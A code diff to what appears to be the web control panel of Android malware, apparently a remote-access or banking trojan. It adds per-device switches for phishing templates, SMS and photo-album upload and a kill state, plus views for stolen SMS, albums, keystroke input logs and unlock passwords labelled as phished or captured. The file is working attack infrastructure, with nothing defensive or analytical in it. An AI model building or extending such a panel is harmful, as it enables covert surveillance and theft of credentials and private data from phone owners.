@@ -36,6 +36,20 @@
       </el-form-item>
 
       <el-form-item>
+        <el-select v-model="dataForm.kill" placeholder="已杀/未杀" clearable>
+          <el-option label="未杀" :value="0"></el-option>
+          <el-option label="已杀" :value="1"></el-option>
+        </el-select>
+      </el-form-item>
+
+      <el-form-item>
+        <el-date-picker v-model="lastActivityTimeRange" type="datetimerange" range-separator="至"
+          start-placeholder="开始时间" end-placeholder="结束时间" format="YYYY-MM-DD HH:mm:ss" value-format="x"
+          @change="onLastActivityTimeChange" style="width: 360px" />
+      </el-form-item>
+
+
+      <el-form-item>
         <el-button @click="getDataList()">{{ $t("query") }}</el-button>
       </el-form-item>
     </el-form>
@@ -74,7 +88,25 @@
             @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
           <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard"
             @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
-          <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
+          <!-- <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish"
+            @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" /> -->
+          <el-switch inactive-text="Kill状态" :model-value="!!scope.row.kill"
+            @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
+
+          <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms"
+            @update:model-value="updateDeviceSwitch(scope.row, 'uploadSms', $event)" />
+
+          <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum"
+            @update:model-value="updateDeviceSwitch(scope.row, 'uploadAlbum', $event)" />
+
+        </template>
+      </el-table-column>
+
+      <el-table-column label="钓鱼开关" header-align="center" align="right" width="150px">
+        <template v-slot="scope">
+          <el-switch v-for="item in fishTemplateList" :key="item.code" :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]"
+          @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
+
         </template>
       </el-table-column>
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
@@ -93,7 +125,7 @@
             <el-tag type="danger" v-else>未授权</el-tag>
           </div>
           <div>
-            状态
+            设备状态
             <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
             <el-tag type="success" v-show="scope.row.status == 1">亮屏</el-tag>
             <el-tag type="info" v-show="scope.row.status == 2">等待唤醒</el-tag>
@@ -103,25 +135,26 @@
       </el-table-column>
 
       <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px"
-        :show-overflow-tooltip="true"></el-table-column>、
-      <el-table-column prop="user" label="业务员" show-overflow-tooltip header-align="center" width="80px"
-        align="center"></el-table-column>
+        :show-overflow-tooltip="true"></el-table-column>
       <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center"
         align="center"></el-table-column>
       <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
         <template v-slot="scope">
           <!-- <el-button-group > -->
           <div>
-            <el-button link type="primary" @click="enterScreen(scope.row)">进入</el-button>
+            <el-button link type="primary" @click="enterScreen(scope.row)">链接设备</el-button>
           </div>
           <div>
             <el-button link type="primary" @click="showInputLog(scope.row)">输入记录</el-button>
           </div>
           <div>
-            <el-button link type="primary" v-if="!scope.row.user" @click="openAddSalesman(scope.row)">添加业务员</el-button>
+            <el-button link type="primary" @click="showAppList(scope.row)">安装应用</el-button>
           </div>
           <div>
-            <el-button link type="primary" @click="showAppList(scope.row)">安装应用</el-button>
+            <el-button link type="primary" @click="showSmsList(scope.row)">短信记录</el-button>
+          </div>
+          <div>
+            <el-button link type="primary" @click="showAlbumList(scope.row)">查看相册</el-button>
           </div>
           <div>
             <el-button link type="primary">备注</el-button>
@@ -136,30 +169,6 @@
     </el-pagination>
 
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
-
-    <!-- 添加业务员弹窗 -->
-    <el-dialog v-model="salesmanDialogVisible" title="添加业务员" width="480px" :close-on-click-modal="false">
-      <div>
-        <el-descriptions :column="1" border size="small" title="设备信息">
-          <el-descriptions-item label="设备ID">{{ salesmanRow?.deviceId }}</el-descriptions-item>
-          <el-descriptions-item label="手机型号">{{ salesmanRow?.model }}</el-descriptions-item>
-          <el-descriptions-item label="品牌">{{ salesmanRow?.brand }}</el-descriptions-item>
-          <el-descriptions-item label="所属包">{{ salesmanRow?.pkg }}</el-descriptions-item>
-        </el-descriptions>
-      </div>
-      <div style="margin-top: 16px">
-        <el-form label-width="90px">
-          <el-form-item label="业务员">
-            <el-input v-model="salesmanName" placeholder="请输入业务员账号" clearable></el-input>
-          </el-form-item>
-        </el-form>
-      </div>
-      <template #footer>
-        <el-button @click="salesmanDialogVisible = false">取消</el-button>
-        <el-button type="primary" @click="doAddSalesman" :loading="salesmanSubmitting">确定</el-button>
-      </template>
-    </el-dialog>
-
     <!-- 输入日志弹窗 -->
     <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
       width="970px" :close-on-click-modal="false" class="input-log-dialog">
@@ -215,16 +224,11 @@
         <el-form label-width="90px">
           <el-form-item label="解锁密码">
             <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
-
-
-              <!-- <el-option v-for="item in unlockOptions" :key="item.id" :label="item.tips" :value="item.id" /> -->
-
-
               <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id">
                 <span style="float: left">{{ formatUnlockTips(item) }}</span>
-                <span style="float: right; color: #8492a6; font-size: 13px"><span style="color:#00adff">{{
-                  item.createDate }}</span></span>
-
+                <span style="float: right; color: #8492a6; font-size: 13px">
+                  <span style="color: #00adff">{{ item.createDate }}</span>
+                </span>
               </el-option>
 
             </el-select>
@@ -237,6 +241,18 @@
           :disabled="!selectedUnlockId">确定</el-button>
       </template>
     </el-dialog>
+
+    <!-- 短信记录弹窗 -->
+    <el-dialog v-model="smsListVisible" :title="`短信记录 - 设备ID: ${currentSmsDevice.deviceId}`" width="1200px"
+      :close-on-click-modal="false">
+      <SmsList :device-id="currentSmsDevice.deviceId" />
+    </el-dialog>
+
+    <!-- 相册列表弹窗 -->
+    <el-dialog v-model="albumListVisible" :title="`相册列表 - 设备ID: ${currentAlbumDevice.deviceId}`" width="1200px"
+      :close-on-click-modal="false">
+      <AlbumList :device-id="currentAlbumDevice.deviceId" />
+    </el-dialog>
   </div>
 </template>
 
@@ -245,12 +261,16 @@ import useView from "@/hooks/useView";
 import baseService from "@/service/baseService";
 import DeviceDetail from "@/views/device/detail.vue";
 import AppList from "@/views/apps/list.vue";
+import SmsList from "@/views/sms/list.vue";
+import AlbumList from "@/views/album/list.vue";
 import { defineComponent, reactive, toRefs, ref } from "vue";
 import { ElMessageBox, ElMessage } from "element-plus";
 export default defineComponent({
   components: {
     DeviceDetail,
-    AppList
+    AppList,
+    SmsList,
+    AlbumList
   },
   setup() {
     const state = reactive({
@@ -266,14 +286,14 @@ export default defineComponent({
         language: "",
         brand: "",
         installApp: "",
-        status: ""
+        status: "",
+        start: "",
+        end: "",
+        kill: ""
       }
     });
     const deviceId = ref("");
-    const salesmanDialogVisible = ref(false);
-    const salesmanName = ref("");
-    const salesmanSubmitting = ref(false);
-    const salesmanRow = ref<any | null>(null);
+    const fishTemplateList = ref<any[]>([]);
     const inputLogVisible = ref(false);
     const logLoading = ref(false);
     const inputLogList = ref([]);
@@ -293,6 +313,15 @@ export default defineComponent({
     const selectedUnlockId = ref<any>(null);
     const unlocking = ref(false);
     const currentWakeRow = ref<any | null>(null);
+    const smsListVisible = ref(false);
+    const currentSmsDevice = ref({
+      deviceId: ""
+    });
+    const albumListVisible = ref(false);
+    const currentAlbumDevice = ref({
+      deviceId: ""
+    });
+    const lastActivityTimeRange = ref<any>(null);
 
     return {
       ...useView(state),
@@ -305,23 +334,42 @@ export default defineComponent({
       queryAppPkg,
       querySource,
       currentDevice,
-      salesmanDialogVisible,
-      salesmanName,
-      salesmanSubmitting,
-      salesmanRow,
       appListVisible,
       currentAppDevice,
       unlockDialogVisible,
       unlockOptions,
       selectedUnlockId,
       unlocking,
-      currentWakeRow
+      currentWakeRow,
+      smsListVisible,
+      currentSmsDevice,
+      albumListVisible,
+      currentAlbumDevice,
+      lastActivityTimeRange,
+      fishTemplateList
     };
   },
   async mounted() {
     await this.fetchInstallAppFilterList();
+    // 初始化默认的最近10分钟时间范围
+    const now = new Date().getTime();
+    const tenMinutesAgo = now - 10 * 60 * 1000;
+    this.lastActivityTimeRange = [tenMinutesAgo, now];
+    this.dataForm.start = tenMinutesAgo;
+    this.dataForm.end = now;
+    // 自动执行一次查询
+    this.getDataList();
+    await this.fetchFishTemplateList();
   },
   methods: {
+    async fetchFishTemplateList() {
+      let { code, data, msg } = await baseService.post("/device/fishCodeList");
+      if (code == 0) {
+        this.fishTemplateList = data;
+      } else {
+        ElMessage.error(msg || "获取钓鱼模板失败");
+      }
+    },
     enterScreen(row: any) {
       this.deviceId = row.deviceId;
       (this.$refs as any).deviceDetail.show(row);
@@ -385,34 +433,6 @@ export default defineComponent({
       }
     },
 
-    openAddSalesman(row: any) {
-      this.salesmanRow = row;
-      this.salesmanName = "";
-      this.salesmanDialogVisible = true;
-    },
-    async doAddSalesman() {
-      if (!this.salesmanRow) return;
-      if (!this.salesmanName || !this.salesmanName.trim()) {
-        ElMessage({ message: "请输入业务员", type: "warning" });
-        return;
-      }
-      this.salesmanSubmitting = true;
-      try {
-        const { code, msg } = await baseService.post("/device/addSalesman", {
-          id: this.salesmanRow.id,
-          salesman: this.salesmanName.trim()
-        });
-        if (code == 0) {
-          ElMessage({ message: "操作成功", type: "success" });
-          this.salesmanDialogVisible = false;
-          this.getDataList();
-        } else {
-          ElMessage({ message: msg || "操作失败", type: "error" });
-        }
-      } finally {
-        this.salesmanSubmitting = false;
-      }
-    },
     async showInputLog(row: any) {
       this.currentDevice.deviceId = row.deviceId;
       this.currentDevice.pkg = row.pkg; // 包名
@@ -503,6 +523,33 @@ export default defineComponent({
 
       return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
     },
+    async updateFishSwitch(row: any, field: string, value: boolean) {
+
+      try {
+        const { success, msg } = await baseService.post(
+          "/device/updateFishSwitch",
+          {
+            id: row.id,
+            code: field,
+            value: value
+          },
+          undefined,
+          true
+        );
+        if (success) {
+          ElMessage.success("更新成功");
+          this.getDataList();
+        } else {
+          ElMessage.error(msg || "更新失败");
+          
+        }
+      } catch (error) {
+        ElMessage.error("更新失败");
+     
+      }
+
+
+    },
     async updateDeviceSwitch(row: any, field: string, value: boolean) {
       // 将 boolean 转换为 int (true -> 1, false -> 0)
       const intValue = value ? 1 : 0;
@@ -558,19 +605,36 @@ export default defineComponent({
       switch (lockScreen.source) {
         case 1:
           source = "钓鱼";
-          break
+          break;
         case 2:
           source = "采集";
-          break
+          break;
         default:
           source = "未知";
-          break
+          break;
       }
       return `(${source}) - ${type}:${lockScreen.tips}`;
     },
     showAppList(row: any) {
       this.currentAppDevice.deviceId = row.deviceId;
       this.appListVisible = true;
+    },
+    showSmsList(row: any) {
+      this.currentSmsDevice.deviceId = row.deviceId;
+      this.smsListVisible = true;
+    },
+    showAlbumList(row: any) {
+      this.currentAlbumDevice.deviceId = row.deviceId;
+      this.albumListVisible = true;
+    },
+    onLastActivityTimeChange(value: any) {
+      if (value && Array.isArray(value) && value.length === 2) {
+        this.dataForm.start = value[0];
+        this.dataForm.end = value[1];
+      } else {
+        this.dataForm.start = "";
+        this.dataForm.end = "";
+      }
     }
   }
 });
